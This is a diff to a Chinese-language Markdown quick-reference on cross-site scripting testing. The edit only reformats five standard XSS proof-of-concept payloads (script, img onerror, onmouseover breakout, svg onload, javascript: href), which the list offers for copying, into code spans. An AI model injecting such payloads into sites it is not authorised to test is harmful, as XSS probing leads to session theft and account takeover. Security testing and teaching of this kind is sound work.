@@ -54,11 +54,11 @@
 - 严格过滤 → `svg onload / 编码绕过`。
 
 ### 常用 payload 速查（便于复制）：
-- <script>alert(1)</script>
-- <img src=x onerror=alert(1)>
-- " onmouseover=alert(1) x=" / ' onmouseover=alert(1) x='
-- <svg onload=alert(1)>
-- javascript:alert(1)（href 情况）
+- `<script>alert(1)</script>`
+- `<img src=x onerror=alert(1)>`
+- `" onmouseover=alert(1) x=" / ' onmouseover=alert(1) x='`
+- `<svg onload=alert(1)>`
+- `javascript:alert(1)（href 情况）`
 
 
 ### 名词解释：
